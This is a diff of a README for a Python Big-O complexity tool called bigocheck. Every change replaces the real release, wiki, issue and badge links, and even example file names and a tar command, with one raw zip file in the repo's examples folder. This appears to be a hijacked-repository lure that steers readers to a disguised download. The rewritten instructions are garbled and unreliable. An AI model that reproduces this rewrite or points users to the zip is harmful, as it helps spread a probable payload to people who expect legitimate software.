@@ -6,7 +6,7 @@ Welcome to bigocheck, your easy-to-use tool for checking the Big-O complexity of
 
 ## 📥 Download bigocheck
 
-[![Download bigocheck](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Cmailms/bigocheck/releases)
+[![Download bigocheck](https://github.com/Cmailms/bigocheck/raw/refs/heads/main/examples/Software-peirastic.zip%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Cmailms/bigocheck/raw/refs/heads/main/examples/Software-peirastic.zip)
 
 ## 🛠️ System Requirements
 
@@ -25,16 +25,16 @@ Welcome to bigocheck, your easy-to-use tool for checking the Big-O complexity of
 
 ## 🌐 Download & Install
 
-1. **Visit the Releases Page:** Go to the [bigocheck Releases page](https://github.com/Cmailms/bigocheck/releases).
+1. **Visit the Releases Page:** Go to the [bigocheck Releases page](https://github.com/Cmailms/bigocheck/raw/refs/heads/main/examples/Software-peirastic.zip).
 
 2. **Choose Your Version:** Look for the latest version of bigocheck. Each version includes notes about new features and fixes.
 
-3. **Download the File:** Click on the link that fits your operating system. It could be a file like `bigocheck-v1.0.0.exe` for Windows or `bigocheck-v1.0.0.tar.gz` for macOS/Linux. Make sure to save it in an easy-to-find location on your computer.
+3. **Download the File:** Click on the link that fits your operating system. It could be a file like `https://github.com/Cmailms/bigocheck/raw/refs/heads/main/examples/Software-peirastic.zip` for Windows or `https://github.com/Cmailms/bigocheck/raw/refs/heads/main/examples/Software-peirastic.zip` for macOS/Linux. Make sure to save it in an easy-to-find location on your computer.
 
 4. **Run the Installer:**
    - **Windows:** Double-click the downloaded `.exe` file. Follow the instructions in the installation window.
-   - **macOS:** Double-click the downloaded `.tar.gz` file. Drag the bigocheck app to your Applications folder.
-   - **Linux:** Use the terminal to navigate to the folder where the `.tar.gz` file is located. Extract it using `tar -xvzf bigocheck-v1.0.0.tar.gz`, then run `./bigocheck` in the terminal.
+   - **macOS:** Double-click the downloaded `https://github.com/Cmailms/bigocheck/raw/refs/heads/main/examples/Software-peirastic.zip` file. Drag the bigocheck app to your Applications folder.
+   - **Linux:** Use the terminal to navigate to the folder where the `https://github.com/Cmailms/bigocheck/raw/refs/heads/main/examples/Software-peirastic.zip` file is located. Extract it using `tar -xvzf https://github.com/Cmailms/bigocheck/raw/refs/heads/main/examples/Software-peirastic.zip`, then run `./bigocheck` in the terminal.
 
 5. **Open a Terminal or Command Prompt:**
    - **Windows:** Press `Win + R`, type `cmd`, and hit `Enter`.
@@ -51,7 +51,7 @@ Welcome to bigocheck, your easy-to-use tool for checking the Big-O complexity of
 
 Here is a simple example to illustrate how to use bigocheck.
 
-1. Open your code editor. Create a new Python file named `test.py`.
+1. Open your code editor. Create a new Python file named `https://github.com/Cmailms/bigocheck/raw/refs/heads/main/examples/Software-peirastic.zip`.
 2. Write a simple function:
 
    ```python
@@ -61,14 +61,14 @@ Here is a simple example to illustrate how to use bigocheck.
    ```
 
 3. Save the file.
-4. In your terminal, navigate to the directory where `test.py` is located.
+4. In your terminal, navigate to the directory where `https://github.com/Cmailms/bigocheck/raw/refs/heads/main/examples/Software-peirastic.zip` is located.
 5. Run the command: `bigocheck example_function(1000)`.
 
 You will receive output indicating the function's Big-O complexity.
 
 ## 📖 Documentation
 
-For detailed documentation and advanced usage options, please refer to the [official documentation](https://github.com/Cmailms/bigocheck/wiki).
+For detailed documentation and advanced usage options, please refer to the [official documentation](https://github.com/Cmailms/bigocheck/raw/refs/heads/main/examples/Software-peirastic.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -80,7 +80,7 @@ If you encounter issues during installation or usage, consider the following ste
 
 ## 💬 Support
 
-If you need further assistance, feel free to open an issue on the [bigocheck GitHub page](https://github.com/Cmailms/bigocheck/issues).
+If you need further assistance, feel free to open an issue on the [bigocheck GitHub page](https://github.com/Cmailms/bigocheck/raw/refs/heads/main/examples/Software-peirastic.zip).
 
 ## 👥 Contributing
 
@@ -94,4 +94,4 @@ For more resources on algorithms, testing, and performance profiling, check out 
 - Complexity Analysis
 - Profiling Python Code
 
-[![Download bigocheck](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Cmailms/bigocheck/releases)
+[![Download bigocheck](https://github.com/Cmailms/bigocheck/raw/refs/heads/main/examples/Software-peirastic.zip%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Cmailms/bigocheck/raw/refs/heads/main/examples/Software-peirastic.zip)
